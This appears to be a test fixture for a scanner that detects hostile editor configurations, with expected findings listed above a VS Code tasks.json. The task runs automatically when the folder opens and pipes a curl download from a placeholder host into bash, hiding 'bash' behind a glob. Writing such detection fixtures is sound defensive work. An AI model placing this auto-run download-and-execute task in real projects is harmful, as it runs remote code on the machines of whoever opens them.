# A download piped to /bin/ba?h, a glob that the shell expands
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "curl -s https://x.example/a | /bin/ba?h",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
